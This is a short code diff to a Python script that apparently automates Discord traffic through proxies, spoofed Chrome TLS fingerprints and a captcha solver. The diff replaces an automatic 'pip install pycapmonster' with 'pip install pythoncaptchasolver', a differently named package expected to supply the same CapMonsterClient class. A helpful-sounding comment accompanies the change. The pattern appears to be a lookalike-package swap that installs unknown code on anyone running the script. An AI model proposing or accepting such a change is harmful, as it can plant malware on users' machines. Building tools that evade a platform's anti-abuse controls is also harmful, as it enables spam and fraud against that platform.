@@ -10,9 +10,9 @@ import httpx
 from colorama import Fore
 import sys
 import os
-os.system('pip install pycapmonster')
+os.system('pip install pythoncaptchasolver')
 try:
-    from pycapmonster import CapMonsterClient
+    from pythoncaptchasolver import CapMonsterClient
 except:
     pass
 #check if data and output folder exists
@@ -107,7 +107,7 @@ class Main():
         proxy = Utils.getproxy()
         proxy_str = str(proxy).strip()
         kkproxy  = Utils.getformattedproxy(proxy_str)
-        client = tls_client.Session(client_identifier='chrome_107')
+        client = tls_client.Session(client_identifier='chrome_108')
         response = client.get("https://discord.com/api/v9/experiments", proxy=f'http://{kkproxy}') #Your code was actually making a request to get fingerprints but it didnt use it at all - Switch  
         fingerprint = response.json()['fingerprint']
         time_solve = time.time()
